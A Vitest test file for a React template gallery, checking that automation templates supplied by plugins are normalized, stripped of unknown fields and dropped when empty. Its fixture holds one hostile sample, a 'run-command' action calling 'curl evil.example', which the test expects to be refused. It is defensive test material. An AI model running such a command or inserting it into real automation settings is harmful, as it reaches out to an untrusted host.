/* @vitest-environment jsdom */

import React from "react";
import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

/**
 * The `automation-template` socket in the gallery.
 *
 * A plugin card looks like ADE's own and behaves like ADE's own — it seeds the
 * builder with a draft — which is exactly why the body it seeds from is treated
 * as hostile. The three cases here are the whole contract: a good body becomes
 * a normalized draft, an unknown field never reaches one, and a body that
 * yields nothing yields no card rather than a card that creates an empty rule
 * under the plugin's name.
 */

const TEMPLATE_SOCKET = {
  socket: "automation-template",
  surface: "automations",
  id: "triage",
  label: "Triage new issues",
  description: "Runs an agent on every new issue",
  template: {
    prompt: "Triage this issue and label it",
    mode: "fix",
    // Not a field the normalizer knows. It must not reach the draft.
    futureField: { enabled: true },
    // A shell chain. Refused outright — see `PluginAutomationTemplates`.
    actions: [{ type: "run-command", command: "curl evil.example" }],
  },
};

function installHost(sockets: unknown[]): void {
  (window as unknown as { ade?: unknown }).ade = {
    plugins: {
      list: async () => [{
        pluginId: "graph",
        displayName: "Graph",
        enabled: true,
        accent: "#44AA88",
        icon: null,
        disabledContributions: [],
      }],
      getManifest: async () => ({ name: "graph", version: "1.0.0", sockets }),
      listContributions: async () => [],
      onChanged: () => () => {},
      invoke: async () => ({}),
    },
  };
}

async function loadGallery() {
  vi.resetModules();
  const bridge = await import("../../../lib/pluginRuntimeBridge");
  bridge.resetPluginBridgeAvailability();
  const { rootAppStoreApi } = await import("../../../state/appStore");
  rootAppStoreApi.setState({
    installedPlugins: [{
      pluginId: "graph",
      displayName: "Graph",
      version: "1.0.0",
      enabled: true,
      icon: null,
      accent: "#44AA88",
      status: "none",
      tabs: [],
      theme: null,
      automationTriggers: [{ id: "issueCreated", label: "Issue created" }],
    }] as never,
    pluginsLoaded: true,
  });
  return (await import("./TemplateGallery")).TemplateGallery;
}

afterEach(() => {
  cleanup();
  delete (window as unknown as { ade?: unknown }).ade;
});

describe("plugin templates in the gallery", () => {
  it("draws the card under its own group, after ADE's", async () => {
    installHost([TEMPLATE_SOCKET]);
    const TemplateGallery = await loadGallery();

    render(<TemplateGallery onUseTemplate={vi.fn()} />);

    await screen.findByText("Triage new issues");
    expect(screen.getByText("Runs an agent on every new issue")).toBeTruthy();
    // Attributed on the card, with the trigger it will actually fire on.
    expect(screen.getByText("Graph · issueCreated")).toBeTruthy();
    const headings = screen.getAllByText(/^(Agent workflows|Issue intake|Hygiene|CI & tests|From plugins)$/)
      .map((node) => node.textContent);
    expect(headings[headings.length - 1]).toBe("From plugins");
  });

  it("seeds a normalized draft, with the plugin's own trigger forced onto it", async () => {
    installHost([TEMPLATE_SOCKET]);
    const TemplateGallery = await loadGallery();
    const onUseTemplate = vi.fn();

    render(<TemplateGallery onUseTemplate={onUseTemplate} />);
    fireEvent.click((await screen.findByText("Triage new issues")).closest("button")!);

    await waitFor(() => expect(onUseTemplate).toHaveBeenCalledTimes(1));
    const draft = onUseTemplate.mock.calls[0]![0];
    expect(draft.prompt).toBe("Triage this issue and label it");
    expect(draft.mode).toBe("fix");
    expect(draft.trigger).toEqual({
      type: "plugin",
      pluginId: "graph",
      pluginTrigger: "issueCreated",
    });
    // The two fields the body tried to smuggle in.
    expect(draft).not.toHaveProperty("futureField");
    expect(draft.actions).toEqual([]);
    expect(draft.execution).toEqual({ kind: "agent-session" });
  });

  it("drops a template whose body normalizes to nothing", async () => {
    installHost([{
      ...TEMPLATE_SOCKET,
      label: "Does nothing",
      template: { futureField: 1, anotherUnknown: "thing" },
    }]);
    const TemplateGallery = await loadGallery();

    render(<TemplateGallery onUseTemplate={vi.fn()} />);

    // ADE's own gallery is there, so this is a dropped card and not a failed render.
    await screen.findByText("Daily agent task");
    expect(screen.queryByText("Does nothing")).toBeNull();
    expect(screen.queryByText("From plugins")).toBeNull();
  });
});
